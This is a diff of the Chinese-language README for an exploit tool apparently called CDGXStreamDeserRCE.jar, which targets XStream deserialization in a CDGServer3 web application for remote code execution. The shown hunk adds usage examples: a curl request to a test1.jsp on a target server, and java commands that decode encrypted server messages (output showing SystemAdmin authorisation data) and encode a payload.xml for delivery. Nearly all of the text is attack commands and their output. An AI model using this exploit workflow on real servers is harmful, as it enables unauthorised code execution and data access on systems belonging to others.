@@ -34,18 +34,28 @@ $ curl -k https://192.168.31.190:8443/CDGServer3/test1.jsp
 e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43
 ```
 
-密文解码
+密文解码，读取文件内容进行解码或直接对字符串进行解码。
+
+```bash
+$ java -jar CDGXStreamDeserRCE.jar -d e.txt
+<?xml version='1.0' encoding="gb2312"?>
+<CDGAuthoriseTemplet>
+  <authoriseTempletList>
+    <AuthoriseTemplet>
+      <name>SystemAdmin</name>
+      <description>3FF8A0978
+....
+```
 
 ```bash
 $ java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
-[+] Decode Successed:
 <?xml version='1.0' encoding="gb2312"?>
 <SystemReturn>
   <returnMessage>Error1200</returnMessage>
 </SystemReturn>
 ```
 
-明文编码，读取文件内容进行编码或直接对字符串进行编码
+明文编码，读取文件内容进行编码或直接对字符串进行编码。
 
 ```bash
 $ java -jar CDGXStreamDeserRCE.jar -e payload.xml
